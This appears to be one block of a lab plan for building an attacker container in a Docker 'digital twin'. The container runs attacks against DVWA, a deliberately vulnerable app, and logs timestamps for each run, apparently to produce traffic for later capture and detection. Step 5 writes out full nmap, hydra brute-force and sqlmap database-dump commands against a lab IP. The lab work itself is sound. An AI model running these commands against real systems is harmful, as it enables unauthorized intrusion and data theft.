# Block 2 — Attack Simulation Engine

**Time budget: ~50 minutes**
**Depends on: Block 1 complete (DVWA + db running on `twin-net`)**

## Goal
Build an `attacker` container on the same network as the twin, and run three attacks against DVWA, each wrapped with start/end timestamp logging.

## Steps

1. Create `attacker/Dockerfile`:
   - Base: `kalilinux/kali-rolling` (or `debian:bookworm-slim` + manual installs if Kali image is unavailable)
   - Install: `nmap`, `hydra`, `sqlmap`, `tcpdump`, `iproute2`, `net-tools`
   - Set a working directory (e.g. `/root/attacks`) for scripts and logs

2. Add the `attacker` service to `docker-compose.yml`:
   - Build from `./attacker`
   - Attach to `twin-net` with a fixed IP (e.g. `10.10.0.20`)
   - No port mapping needed (this container only needs to reach `dvwa`, not be reached from host)
   - Mount a host volume for `logs/` so timestamp logs persist outside the container

3. Bring up / rebuild:
   ```
   docker compose up -d --build attacker
   ```

4. Write a small wrapper script (bash or python) used for all three attacks below. It should, for each attack:
   - Echo `START <attack_name> <timestamp>` to `logs/attack_log.txt`
   - Run the attack command
   - Echo `END <attack_name> <timestamp>` to `logs/attack_log.txt`

5. Run three attacks from inside the `attacker` container, each wrapped per step 4:

   **a. Nmap scan**
   ```
   nmap -sV -p- 10.10.0.10
   ```

   **b. Hydra brute force** (against DVWA login form, low security level assumed)
   ```
   hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.0.10 http-post-form \
     "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
   ```
   (adjust wordlist path/size — use a small custom wordlist of ~20-50 passwords if rockyou.txt is too slow for the time budget)

   **c. sqlmap** (against DVWA's SQL Injection page, need a valid session cookie from a logged-in session)
   ```
   sqlmap -u "http://10.10.0.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" \
     --cookie="PHPSESSID=<session_id>; security=low" --batch --dump
   ```

6. Confirm `logs/attack_log.txt` contains clear START/END timestamp pairs for all three attacks, in order.

## Deliverable
- `attacker` container built and running on `twin-net`
- `logs/attack_log.txt` with timestamped START/END entries for: Nmap scan, Hydra brute force, sqlmap SQLi
- All three attacks confirmed to have actually executed (visible output/results in terminal, not just commands fired)

## Explicitly not in scope for this block
- No DoS/Slowloris/hping3 (deferred to next session — flaky in Docker, not worth the time risk today)
- No traffic capture yet (that's Block 3, but can run concurrently if time allows — see Block 3 notes)
